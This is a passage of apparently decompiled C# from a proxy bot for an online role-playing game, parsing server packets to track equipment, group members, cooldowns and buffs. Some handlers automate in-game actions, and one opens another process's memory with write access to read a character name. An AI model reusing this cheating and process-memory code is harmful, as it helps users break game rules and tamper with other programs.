          client.Overhat = str;
          break;
      }
      return true;
    }

    public bool ServerMessage_0x38_RemoveAppendage(Client client, ServerPacket msg)
    {
      switch (msg.ReadByte())
      {
        case 1:
          client.staffnow = string.Empty;
          break;
        case 2:
          if (client.armornow != string.Empty)
          {
            client.removedarmordelay = DateTime.UtcNow;
            client.removedarmor = client.armornow;
          }
          client.armornow = string.Empty;
          break;
        case 3:
          client.ShieldOn = false;
          break;
        case 6:
          client.Necklace = string.Empty;
          break;
        case 15:
          client.Overcoat = string.Empty;
          break;
        case 16:
          client.Overhat = string.Empty;
          break;
      }
      return true;
    }

    public bool ServerMessage_0x39_Profile(Client client, ServerPacket msg)
    {
      client.ihaveamentor = false;
      bool flag1 = false;
      bool flag2 = false;
      bool flag3 = false;
      bool flag4 = false;
      bool flag5 = false;
      if (client.Tab.improveskill.Text.Equals("Tailoring (cowl)") && client.Tab.impskillbutton.Text == "Stop")
        flag2 = true;
      else if (client.Tab.improveskill.Text.Equals("Tailoring") && client.Tab.impskillbutton.Text == "Stop")
        flag2 = true;
      else if (client.Tab.improveskill.Text.Contains("Herbalist") && client.Tab.impskillbutton.Text == "Stop")
        flag3 = true;
      else if (client.Tab.improveskill.Text.Equals("Wizardry Researcher") && client.Tab.impskillbutton.Text == "Stop")
        flag4 = true;
      else if (client.Tab.improveskill.Text.Equals("Elementalist") && client.Tab.impskillbutton.Text == "Stop")
        flag5 = true;
      client.GroupMembers.Clear();
      client.Nation = msg.ReadByte();
      msg.ReadString((int) msg.ReadByte());
      msg.ReadString((int) msg.ReadByte());
      string str1 = msg.ReadString((int) msg.ReadByte());
      int num1 = (int) msg.ReadByte();
      msg.ReadString((int) msg.ReadByte());
      msg.ReadByte();
      client.Medenian = msg.ReadByte();
      msg.ReadByte();
      msg.ReadString((int) msg.ReadByte());
      msg.ReadString((int) msg.ReadByte());
      byte num2 = msg.ReadByte();
      for (int index = 0; index < (int) num2; ++index)
      {
        msg.ReadByte();
        msg.ReadByte();
        string key = msg.ReadString((int) msg.ReadByte());
        string text = msg.ReadString((int) msg.ReadByte());
        if (!client.LegendMarks.ContainsKey(key))
          client.LegendMarks.Add(key, text);
        if (flag2 && text.Contains("Tailor ("))
          client.SendMessage(text, (byte) 18, false);
        else if (flag3 && text.Contains("Herbalist ("))
          client.SendMessage(text, (byte) 18, false);
        else if (flag4 && text.Contains("Wizardry Researcher ("))
          client.SendMessage(text, (byte) 18, false);
        else if (flag5 && text.Contains("Elementalist ("))
          client.SendMessage(text, (byte) 18, false);
        else if (text.Contains("Dugon by"))
        {
          string str2 = text.Substring(0, text.IndexOf(' '));
          if (str2 == "White")
            client.currentdugon = "Green";
          else if (str2 == "Green")
            client.currentdugon = "Blue";
          else if (str2 == "Blue")
            client.currentdugon = "Yellow";
          else if (str2 == "Yellow")
            client.currentdugon = "Purple";
          else if (str2 == "Purple")
            client.currentdugon = "Brown";
          else if (str2 == "Brown")
            client.currentdugon = "Red";
          else if (str2 == "Red")
            client.currentdugon = "Black";
          flag1 = true;
        }
        else if (text.Contains("Mentored by "))
          client.ihaveamentor = true;
      }
      if (!flag1)
        client.currentdugon = "White";
      if (str1.Contains("Total"))
      {
        string[] strArray = str1.Substring(14, str1.IndexOf("Total") - 14).Split(new string[1]
        {
          "\n"
        }, 14, StringSplitOptions.None);
        for (int index = 0; index < strArray.Length - 1; ++index)
        {
          strArray[index] = strArray[index].Trim();
          if (strArray[index].StartsWith("* "))
            strArray[index] = strArray[index].Remove(0, 2);
          if (strArray[index] != client.Name)
            client.GroupMembers.Add(strArray[index]);
        }
      }
      return true;
    }

    public bool ServerMessage_0x3A_SpellBar(Client client, ServerPacket msg)
    {
      ushort key = msg.ReadUInt16();
      byte num = msg.ReadByte();
      if (num > (byte) 0)
      {
        if (!client.SpellBarTimers.ContainsKey(key))
          client.SpellBarTimers.Add(key, DateTime.UtcNow);
        if (key == (ushort) 89 && num != (byte) 6)
        {
          client.IsSkulled = true;
          Server.StaticCharacters[client.PlayerID].IsSkulled = true;
        }
        if (!client.SpellBar.Contains(key))
          client.SpellBar.Add(key);
        if (num == (byte) 1 && key == (ushort) 10 && client.Tab.vselfhide && !client.pause)
        {
          client.hidetime = DateTime.UtcNow;
          client.MacroCast("Hide", new uint?());
          client.MacroCast("White Bat Stance", new uint?());
          if (client.CanSkill("Claw Fist", false))
            client.UseSkill("Claw Fist", 0U);
          else if (client.CanSkill("ao beag suain", false))
            client.UseSkill("ao beag suain", 0U);
          else
            client.UseSkill("Assail", 0U);
          client.MacroCast("Hide", new uint?());
          client.MacroCast("White Bat Stance", new uint?());
        }
      }
      else
      {
        if (client.SpellBarTimers.ContainsKey(key))
        {
          client.SendMessage("Icon: " + key.ToString() + " lasted " + DateTime.UtcNow.Subtract(client.SpellBarTimers[key]).TotalMilliseconds.ToString() + " ms.", (byte) 0, true);
          client.SpellBarTimers.Remove(key);
        }
        if (key == (ushort) 8 && Program.MainForm.expalert.Checked && !client.Tab.expapbonus.Checked)
        {
          if (!Server.SentryAlarm)
          {
            Server.SentryAlarm = true;
            Server.alarm = new SoundPlayer(Assembly.GetExecutingAssembly().GetManifestResourceStream("ProxyBase.Ding.wav"));
            Server.alarmTimer = DateTime.UtcNow;
            Server.alarm.Play();
          }
          client.SendMessage(client.Name + "'s bonus ran out", "red", true);
        }
        if (key == (ushort) 148 && Program.MainForm.expalert.Checked && !client.Tab.xpshroom.Checked)
        {
          if (!Server.SentryAlarm)
          {
            Server.SentryAlarm = true;
            Server.alarm = new SoundPlayer(Assembly.GetExecutingAssembly().GetManifestResourceStream("ProxyBase.Ding.wav"));
            Server.alarmTimer = DateTime.UtcNow;
            Server.alarm.Play();
          }
          client.SendMessage(client.Name + "'s bonus ran out", "red", true);
        }
        if (key == (ushort) 147 && Program.MainForm.expalert.Checked && !client.Tab.useskillbonus.Checked && !client.Tab.abrune.Checked)
        {
          if (!Server.SentryAlarm)
          {
            Server.SentryAlarm = true;
            Server.alarm = new SoundPlayer(Assembly.GetExecutingAssembly().GetManifestResourceStream("ProxyBase.Ding.wav"));
            Server.alarmTimer = DateTime.UtcNow;
            Server.alarm.Play();
          }
          client.SendMessage(client.Name + "'s bonus ran out", "red", true);
        }
        client.SpellBar.Remove(key);
      }
      return true;
    }

    public bool ServerMessage_0x3F_Cooldown(Client client, ServerPacket msg)
    {
      byte num1 = msg.ReadByte();
      byte num2 = msg.ReadByte();
      uint num3 = msg.ReadUInt32();
      client.ImCasting = false;
      if (num1 == (byte) 0)
      {
        if (num2 > (byte) 0)
        {
          Spell spell = client.SpellBook[(int) num2 - 1];
          if (spell != null)
          {
            client.GlobalSpellCD = DateTime.UtcNow;
            spell.NextUse = num3 == 0U ? DateTime.UtcNow.AddMilliseconds(335.0) : DateTime.UtcNow.AddMilliseconds((double) (num3 * 1000U));
          }
        }
      }
      else if (num2 > (byte) 0)
      {
        Skill skill = client.SkillBook[(int) num2 - 1];
        if (skill != null)
          skill.NextUse = num3 == 0U ? DateTime.UtcNow.AddMilliseconds(335.0) : DateTime.UtcNow.AddMilliseconds((double) (num3 * 1000U));
      }
      return true;
    }

    public bool ServerMessage_0x42_ExchangeWindow(Client client, ServerPacket msg)
    {
      byte num1 = msg.ReadByte();
      if (num1 == (byte) 0)
      {
        client.cancast = false;
        client.canskill = false;
        client.donotwalk = true;
        msg.ReadUInt32();
        msg.ReadString((int) msg.ReadByte());
      }
      byte num2;
      if (num1 == (byte) 2)
      {
        num2 = msg.ReadByte();
        msg.ReadByte();
        int num3 = (int) msg.ReadUInt16();
        int num4 = (int) msg.ReadByte();
        msg.ReadString((int) msg.ReadByte());
      }
      if (num1 == (byte) 3)
      {
        num2 = msg.ReadByte();
        msg.ReadUInt32();
      }
      string str;
      if (num1 == (byte) 4)
      {
        client.cancast = true;
        client.canskill = true;
        client.donotwalk = false;
        num2 = msg.ReadByte();
        str = msg.ReadString((int) msg.ReadByte());
      }
      if (num1 == (byte) 5)
      {
        client.cancast = true;
        client.canskill = true;
        client.donotwalk = false;
        num2 = msg.ReadByte();
        str = msg.ReadString((int) msg.ReadByte());
      }
      return true;
    }

    public bool ServerMessage_0x4C_LogOffSignal(Client client, ServerPacket msg)
    {
      client.manuallog = true;
      client.LoggedOn = false;
      return true;
    }

    public bool ServerMessage_0x60_OK(Client client, ServerPacket msg)
    {
      if (Server.Relog.Count > 0)
      {
        foreach (ProxyBase.Relog relog in Server.Relog.Values)
        {
          if (relog != null && relog.WaitForOk)
          {
            client.stream = new ProcessMemoryStream(relog.Process.Id, ProcessAccess.VmOperation | ProcessAccess.VmRead | ProcessAccess.VmWrite);
            client.stream.Position = client.nameadd;
            byte[] numArray = new byte[relog.Name.Length];
            client.stream.Read(numArray, 0, relog.Name.Length);
            string index = Encoding.ASCII.GetString(numArray);
            if (Server.Relog[index].WaitForOk)
            {
              Server.Relog[index].WaitForOk = false;
              break;
            }
          }
        }
      }
      return true;
    }

    public bool ServerMessage_0x67_WorldMapResponse(Client client, ServerPacket msg)
    {
      client.mapresponse = true;
      return true;
    }
  }
}
